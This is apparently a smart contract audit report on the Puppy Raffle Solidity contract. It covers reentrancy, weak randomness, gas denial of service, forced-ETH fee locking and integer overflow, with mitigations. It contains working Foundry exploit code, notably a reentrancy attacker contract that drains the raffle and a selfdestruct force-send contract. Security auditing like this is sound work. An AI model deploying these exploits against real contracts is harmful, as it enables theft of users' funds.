# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### 🐾 Puppy Raffle Protocol

Puppy Raffle is an on-chain game that lets users buy tickets to win an NFT puppy. The contract is written for Solidity 0.7.6 and thoroughly tested with Foundry.

1. **Entering** – Anyone calls `enterRaffle(address[] newPlayers)` sending `entranceFee` (1 ETH) per address. The function rejects duplicate addresses and mismatched payment, then appends players to an array. 20 % of each ticket is earmarked as protocol fees.

2. **Refunds** – Before a winner is chosen, a player may call `refund(uint256 index)` to reclaim their fee. The slot is zeroed so the array length stays constant and duplicates remain impossible.

3. **Selecting a Winner** – After `raffleDuration` (1 day by default) and once ≥1 active player exists, anyone can invoke `selectWinner()`. A pseudo-random index is derived from block data; that address receives 80 % of the contract balance and a freshly minted Puppy NFT whose rarity is randomly assigned. The raffle state resets for the next round.

4. **Fee Management** – Accumulated fees are withdrawable by `feeAddress` via `withdrawFees()` only when all players have exited. The owner can update `feeAddress` with `changeFeeAddress()`.

The design emphasizes fairness (no duplicates, refund option), transparency, and clean separation of player funds and protocol earnings.
## High Risk Findings
[H-1]. Reentrancy issue in PuppyRaffle::refund
[H-2]. Randomness issue in PuppyRaffle::selectWinner
## Medium Risk Findings
[M-1]. DOS issue in PuppyRaffle::enterRaffle
[M-2]. Unexpected Eth issue in PuppyRaffle::withdrawFees
## Low Risk Findings
[L-1]. Integer Overflow issue in PuppyRaffle::selectWinner


### Number of Findings
- C: 0
- H: 2
- M: 2
- L: 1
- I: 0



# High Risk Findings

## [H-1]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function transfers Ether to the user before updating the state. Specifically, the `players[playerIndex]` is set to `address(0)` after the external call `payable(msg.sender).sendValue(entranceFee)`. This violates the Checks-Effects-Interactions pattern and opens the door to a reentrancy attack. A malicious contract could call `refund` repeatedly within the same transaction by re-entering from its `receive()` or `fallback()` function, draining funds from the contract.

## Impact
By re-entering refund() before players[playerIndex] is cleared, an attacker can withdraw the entrance fee over and over until the contract balance is emptied. All funds that other players have sent to the raffle (and the 20 % protocol fee) can be stolen, leaving victims with no way to recover their ETH. The loss is capped only by the contract balance, therefore equals a full drain of user funds held in the raffle round.

## Proof of Concept
1. An attacker deploys a malicious contract (`Attacker.sol`).
2. The attacker calls a function on `Attacker.sol` which makes it enter the raffle by paying the `entranceFee`.
3. The attacker then calls another function on `Attacker.sol` that initiates the refund process by calling `PuppyRaffle.refund()`.
4. `PuppyRaffle` validates the request and sends the `entranceFee` back to the `Attacker` contract.
5. The `Attacker` contract's `receive()` function is triggered, which is coded to immediately call `PuppyRaffle.refund()` again.
6. Since `players[playerIndex]` has not yet been set to `address(0)`, the second call to `refund` is also considered valid. The contract sends another `entranceFee`.
7. This process repeats, allowing the attacker to withdraw more funds than they originally deposited.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ReentrantAttacker {
    PuppyRaffle public raffle;
    uint256 public entranceFee;
    uint256 private reenterCount;

    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
        entranceFee = _raffle.entranceFee();
    }

    // kick-off
    function attack() external payable {
        address[] memory a = new address[](1);
        a[0] = address(this);
        raffle.enterRaffle{value: entranceFee}(a);
        uint256 idx = raffle.getActivePlayerIndex(address(this));
        raffle.refund(idx);
    }

    receive() external payable {
        // steal until contract is empty or we run out of gas
        if (address(raffle).balance >= entranceFee && reenterCount < 20) {
            reenterCount++;
            uint256 idx = raffle.getActivePlayerIndex(address(this));
            raffle.refund(idx);
        }
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle raffle;
    ReentrantAttacker attacker;
    uint256 constant FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(this), 1 days);
        // fund raffle with ten honest players
        address[] memory victims = new address[](10);
        for (uint256 i; i < 10; i++) {
            victims[i] = address(uint160(i + 1));
        }
        raffle.enterRaffle{value: 10 * FEE}(victims);

        attacker = new ReentrantAttacker(raffle);
        vm.deal(address(attacker), FEE); // give attacker 1 ETH to pay entrance fee
    }

    function testDrainViaReentrancy() public {
        uint256 pot = address(raffle).balance; // 10 ETH (victims only)
        vm.prank(address(attacker));
        attacker.attack{value: FEE}(); // attacker deposits + starts refund loop

        assertEq(address(raffle).balance, 0, "all funds drained");
        // attacker started with 1 ETH, ends with previous pot + deposit
        assertEq(address(attacker).balance, pot + FEE, "attacker profit matches pot");
    }
}

## Suggested Mitigation
Apply Checks-Effects-Interactions: assign `players[playerIndex] = address(0);` before transferring ETH, **and** inherit OpenZeppelin’s `ReentrancyGuard` and add `nonReentrant` to refund() to future-proof against similar patterns:

```solidity
function refund(uint256 playerIndex) public nonReentrant {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    players[playerIndex] = address(0); // effects first
    payable(msg.sender).sendValue(entranceFee); // interaction last
}
```

## [H-2]. Randomness issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses on-chain data like `block.timestamp`, `block.difficulty`, and `msg.sender` to determine the winner and NFT rarity. These sources are not truly random and can be predicted or manipulated by blockchain participants, especially miners (or validators in a PoS context). A miner who is also a player can calculate the outcome of a `selectWinner` transaction. If they are not the winner, they can choose not to include the transaction in their block, giving them an unfair advantage by allowing them to re-run the selection process until they win.

## Impact
Because msg.sender, block.timestamp and block.difficulty are all either chosen by or known to the block producer, a miner/validator who is also a raffle participant can fully pre-compute the winner for any candidate transaction before including it. The miner keeps replacing (or censoring) selectWinner() transactions until the hash points to one of their own entries, at which point they mine the transaction and immediately receive 80 % of the ETH that all honest players paid plus the newly minted NFT. This is a deterministic, unbounded strategy that lets the attacker steal the entire prize pool every round, not merely ‘increase their odds’. The protocol funds can therefore be drained round after round and honest users have no chance of winning.

## Proof of Concept
1. A miner participates in the raffle by calling `enterRaffle`.
2. Once the raffle duration is over, another user calls `selectWinner()`.
3. The miner sees this transaction in the mempool.
4. The miner can execute the transaction locally, using the known `msg.sender`, the current block's `timestamp`, and `difficulty` to calculate the `winnerIndex`.
5. If the calculated `winnerIndex` corresponds to the miner's address, they include the transaction in the block they are mining and win the prize.
6. If the winner is someone else, the miner can simply ignore the `selectWinner` transaction and not include it in their block. They can then wait for another user to call it or call it themselves in a future block where the parameters might favor them.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RandomnessTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 public constant ENTRANCE_FEE = 1 ether;
    uint256 public constant RAFFLE_DURATION = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, address(this), RAFFLE_DURATION);
        address[] memory players = new address[](4);
        players[0] = makeAddr("p1");
        players[1] = makeAddr("p2");
        players[2] = makeAddr("p3");
        players[3] = makeAddr("p4"); // Miner's address
        vm.prank(players[0]);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);
        vm.warp(block.timestamp + RAFFLE_DURATION + 1);
    }

    function testMinerCanPredictWinner() public {
        // A non-miner tries to select the winner
        address nonMiner = makeAddr("nonMiner");

        // The miner can predict the outcome of this call before it's mined.
        bytes32 predictableHash = keccak256(abi.encodePacked(nonMiner, block.timestamp, block.difficulty));
        uint256 predictedWinnerIndex = uint256(predictableHash) % 4;

        console.log("Predicted winner index if nonMiner calls: ", predictedWinnerIndex);

        // The miner checks if they win. If not, they don't include the tx.
        // We simulate this by asserting the predicted index.
        // If predictedWinnerIndex is not 3 (the miner's index), the miner would censor the tx.

        // Let's assume the miner waits and calls selectWinner themselves when conditions are favorable.
        address miner = puppyRaffle.players(3);
        vm.prank(miner);
        
        // The miner can now perfectly predict their own call's outcome.
        bytes32 minerHash = keccak256(abi.encodePacked(miner, block.timestamp, block.difficulty));
        uint256 minerWinnerIndex = uint256(minerHash) % 4;
        console.log("Winner index when miner calls: ", minerWinnerIndex);

        // This test doesn't prove manipulation, but demonstrates the determinism that enables it.
        // A true PoC requires off-chain simulation of miner behavior.
        // We can show that the outcome is deterministic.
        vm.prank(nonMiner);
        puppyRaffle.selectWinner();
        
        assertEq(puppyRaffle.previousWinner(), puppyRaffle.players(predictedWinnerIndex));
    }
}
```

## Suggested Mitigation
The use of on-chain data for randomness should be replaced with a more secure solution like Chainlink VRF (Verifiable Random Function). VRF provides provably fair and verifiable randomness that cannot be manipulated by miners or the contract owner.

```solidity
// Example using a VRF Coordinator
interface IVRFCoordinatorV2 { 
    function requestRandomWords(...) external returns (uint256 requestId);
    function getRequestStatus(...) external view returns (bool fulfilled, uint256[] memory randomWords);
}

// In the contract
// 1. Request randomness when selectWinner is called.
// 2. A separate `fulfillRandomWords` callback function would receive the random number.
// 3. Inside `fulfillRandomWords`, use the provided random number to select the winner and mint the NFT.
// This creates a two-step process that is resistant to manipulation.
```



# Medium Risk Findings

## [M-1]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function contains a nested loop to check for duplicate player addresses. This loop has a time complexity of O(n^2), where n is the total number of players in the raffle. As the `players` array grows, the gas cost of calling `enterRaffle` will increase quadratically. Eventually, the gas required will exceed the block gas limit, making it impossible for anyone to enter the raffle and effectively causing a permanent Denial of Service for the current round.

## Impact
Because the duplicate-check is quadratic, gas cost per `enterRaffle` call grows until it exceeds the block gas limit. Once the player list is large enough (thousands of addresses), any further call to `enterRaffle` will consistently run out of gas, temporarily freezing the raffle until `selectWinner` empties `players`. Funds already in the contract remain safe but no new users can participate, blocking new revenue and interaction until the round finishes.

## Proof of Concept
1. Assume an 8 000 000 gas block limit (≈Ethereum mainnet).
2. An attacker (or group of users) submits a single transaction with 2 000 fresh addresses paying the entrance fee for each. The transaction costs < 8 M gas because the duplicate-check executes while the array is still small.
3. The internal `players` length is now 2 000.
4. A subsequent user tries to add **one** additional address. The nested `for` loops have to perform ≈2 000² /2 ≈ 2 000 000 comparisons, consuming > 8 M gas, so the transaction runs out of gas and reverts.
5. Until the owner (or anyone) can successfully call `selectWinner` and clear `players`, `enterRaffle` is unusable – a denial of service for the rest of the round.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract GasDosTest is Test {
    PuppyRaffle internal raffle;
    uint256 constant FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(this), 1 days);
        // Simulate main-net like block gas limit so that out-of-gas can be caught.
        vm.txGasLimit(8_000_000);
    }

    function testDenialOfServiceWhenArrayIsLarge() public {
        uint256 n = 2000; // costs 2 000 ETH on main-net; attacker can later refund.
        address[] memory crowd = new address[](n);
        for (uint256 i; i < n; ++i) {
            crowd[i] = address(uint160(i + 1));
        }
        raffle.enterRaffle{value: FEE * n}(crowd);

        address[] memory extra = new address[](1);
        extra[0] = address(0xDEADBEEF);

        vm.expectRevert(); // bubbling empty bytes because OOG is treated as revert with no data.
        raffle.enterRaffle{value: FEE}(extra);
    }
}

## Suggested Mitigation
Record participation in a `mapping(address => bool) hasEntered`. On `enterRaffle` ensure `!hasEntered[p]` before accepting the address and set the flag afterwards. When a player calls `refund` or when `selectWinner` resets the round, loop over the affected addresses to set `hasEntered[p] = false`. This reduces duplicate detection to O(1) and removes the quadratic gas growth entirely.

## [M-2]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function uses a strict equality check `require(address(this).balance == uint256(totalFees), ...)` to ensure no players are active. However, it's possible for a contract to receive Ether via `selfdestruct` from another contract or through pre-computed contract addresses. If even 1 wei is forcibly sent to the `PuppyRaffle` contract, `address(this).balance` will become greater than `uint256(totalFees)`. This will cause the `require` statement to fail permanently, locking all collected fees in the contract forever.

## Impact
Any user can permanently block the protocol owner from withdrawing the 20 % fee revenue by forcibly sending ≥1 wei to the contract (via self-destruct or create2 pre-fund). The funds remain locked in the contract; players’ prize pool is not affected, but the protocol loses all accumulated fees.

## Proof of Concept
pragma solidity ^0.7.6;

contract ForceSend {
    constructor() payable {}
    function boom(address payable target) external {
        selfdestruct(target); // force-send all ETH held by this contract
    }
}

/* Attack steps
1. Anyone deploys `ForceSend` with 1 wei: new ForceSend{value:1 wei}();
2. Call `boom(puppyRaffle)`; 1 wei is force-sent to the raffle contract.
3. Later, the feeAddress tries PuppyRaffle.withdrawFees(); it reverts because
   address(this).balance (totalFees + 1) != totalFees.
4. No matter how many rounds run afterwards, the inequality persists and the
   owner can never withdraw fees again.*/

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ForceSend {
    constructor() payable {}
    function boom(address payable target) external {
        selfdestruct(target);
    }
}

contract FeeLockTest is Test {
    PuppyRaffle raffle;
    address feeAddr = address(0xfee);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, feeAddr, 1 days);

        // have 4 players enter so the contract owns some fees
        address[] memory p = new address[](4);
        for (uint i; i < 4; ++i) p[i] = address(uint160(i + 1));
        raffle.enterRaffle{value: 4 ether}(p);
        vm.warp(block.timestamp + 1 days + 1);
        raffle.selectWinner();
        assertGt(raffle.totalFees(), 0);
    }

    function testWithdrawBlocked() public {
        // force-send 1 wei
        ForceSend fs = new ForceSend{value: 1 wei}();
        fs.boom(payable(address(raffle)));
        assertEq(address(raffle).balance, uint256(raffle.totalFees()) + 1);

        vm.prank(feeAddr);
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Do not rely on balance equality. Check that no players are active instead: `require(players.length == 0, "active players");` and transfer only `totalFees`. Alternatively, compare `address(this).balance >= totalFees` to tolerate stray ETH.



# Low Risk Findings

## [L-1]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
In `selectWinner`, the protocol fee is calculated and added to `totalFees`. `totalFees` is a `uint64` to save gas via storage packing, but the `fee` variable is a `uint256`. The line `totalFees = totalFees + uint64(fee);` performs an unsafe downcast. If the raffle accumulates a very large prize pool over multiple rounds, the `fee` could exceed `type(uint64).max`. The subsequent addition would overflow `totalFees`, causing it to wrap around to a small number. This leads to incorrect accounting and will cause the `withdrawFees` function to fail, as the contract's actual balance will be much larger than the small, wrapped-around `totalFees` value.

## Impact
If the owner deploys the contract with an entranceFee so large that the 20 % protocol fee of one (or multiple) raffles exceeds 2^64-1 wei, the value is truncated when cast to uint64. From that point on, `totalFees` becomes inaccurate, and `withdrawFees()` will revert forever, permanently locking the protocol-fee funds that are already inside the contract. No user funds can be stolen, only the protocol’s fees become stuck.

## Proof of Concept
1. Set a very high `entranceFee` such that a few rounds of the raffle will generate fees exceeding `type(uint64).max`.
2. For instance, `entranceFee` = `(type(uint64).max / 4) * 5`.
3. Run a raffle with 4 players. The total collected is `type(uint64).max * 5`. The fee (20%) is `type(uint64).max`.
4. In `selectWinner`, `totalFees` becomes `type(uint64).max`.
5. Run a second, identical raffle round. The new fee is again `type(uint64).max`.
6. The calculation `totalFees = totalFees + uint64(fee)` becomes `type(uint64).max + type(uint64).max`, which overflows and wraps `totalFees` to `type(uint64).max - 1`.
7. The actual ETH balance for fees in the contract is `2 * type(uint64).max`, but `totalFees` stores a much smaller number. The `withdrawFees` function is now permanently broken.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract IntegerOverflowTest is Test {
    PuppyRaffle puppyRaffle;
    address public feeAddress = makeAddr("feeAddress");
    uint256 public constant RAFFLE_DURATION = 1 days;
    // Set a massive entrance fee to trigger the overflow quickly
    uint256 public constant HUGE_ENTRANCE_FEE = (2**64 / 4) * 5; // 20% of this is 2**64 / 4

    function setUp() public {
        puppyRaffle = new PuppyRaffle(HUGE_ENTRANCE_FEE, feeAddress, RAFFLE_DURATION);
    }

    function testTotalFeesOverflow() public {
        // Run first round, totalFees will be close to uint64.max
        runRaffleRound(4);
        uint64 feesAfterFirstRound = puppyRaffle.totalFees();
        uint256 expectedFee = (HUGE_ENTRANCE_FEE * 4 * 20) / 100;
        assertEq(feesAfterFirstRound, uint64(expectedFee));

        // Run a second round. The addition to totalFees will overflow.
        runRaffleRound(4);
        uint64 feesAfterSecondRound = puppyRaffle.totalFees();
        
        // The fees should be 2 * expectedFee, but it has overflowed.
        uint256 correctTotalFees = expectedFee * 2;
        assertTrue(feesAfterSecondRound < correctTotalFees);
        
        // The actual contract balance holding the fees will be correctTotalFees
        // But the totalFees variable is wrong. Withdraw will fail.
        assertEq(address(puppyRaffle).balance, correctTotalFees);
        
        vm.prank(feeAddress);
        vm.expectRevert("PuppyRaffle: There are currently players active!"); // Misleading error
        puppyRaffle.withdrawFees();
    }

    function runRaffleRound(uint256 numPlayers) internal {
        address[] memory players = new address[](numPlayers);
        for (uint256 i = 0; i < numPlayers; i++) {
            players[i] = address(uint160(uint256(keccak256(abi.encodePacked(block.timestamp, i)))));
        }
        puppyRaffle.enterRaffle{value: HUGE_ENTRANCE_FEE * numPlayers}(players);
        vm.warp(block.timestamp + RAFFLE_DURATION + 1);
        puppyRaffle.selectWinner();
    }
}
```

## Suggested Mitigation
Use a `uint256` for `totalFees` to prevent overflow, or use a safe math library to check for overflow before the addition. Given that `fee` is already `uint256`, it is simplest and safest to make `totalFees` a `uint256` as well. The gas savings from storage packing are not worth the risk of losing all protocol fees.

```diff
-   // We do some storage packing to save gas
-   address public feeAddress;
-   uint64 public totalFees = 0;
+   address public feeAddress;
+   uint256 public totalFees = 0;

// ... in selectWinner() ...
-
-       totalFees = totalFees + uint64(fee);
+       totalFees = totalFees + fee;
```



